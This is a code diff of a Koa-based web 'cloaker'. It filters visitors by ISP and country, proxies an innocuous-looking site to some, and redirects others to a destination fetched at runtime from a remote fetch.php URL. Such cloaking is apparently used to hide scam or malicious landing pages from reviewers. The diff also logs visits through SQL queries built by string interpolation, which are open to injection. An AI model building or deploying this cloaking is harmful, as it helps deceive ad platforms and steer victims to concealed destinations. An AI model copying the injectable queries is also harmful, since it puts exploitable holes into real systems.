@@ -16,7 +16,7 @@ var blocked_isp = []
 var blocked_geo = ['Italy']
 var blackl_isp = []
 var Koa = require('koa');
-const koaProxy = require('koa-proxies');
+const koaProxy = require('koa-proxy');
 const mysql = require('serverless-mysql')
 var Router = require('koa-router');
 var router = new Router();
@@ -26,14 +26,10 @@ const app2 = new Koa()
 
 var surl = 'https://www.savorjapan.com/'
 var murl = 'https://www.careerclip.com/fetch.php'
-app2.use(koaProxy('/', {
-  target: surl,
-  changeOrigin: true,
-  logs: true,
-  autoRewrite: true
 
+app2.use(koaProxy({
+  host: surl
 }))
-
 
 app.use(requestIp.mw())
 
@@ -110,7 +106,7 @@ console.log("IP: "+process.env.MYSQL_HOST)
 					    console.log(date)
 					    		const users =  db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
 								
-									
+									console.log('4')
 									res.status(200).redirect('http://localhost:5500/');
 					    }
 				  })
@@ -124,7 +120,7 @@ request({uri: murl},
 								    const users =  db.query(`INSERT INTO cloaker (date, isp, geo) VALUES ('${date}','${isp}', '${geo}')`);
 									  
 									
-									console.log('3')
+									console.log('5')
 									res.status(200).redirect(body);
 									res.end();
 								  });
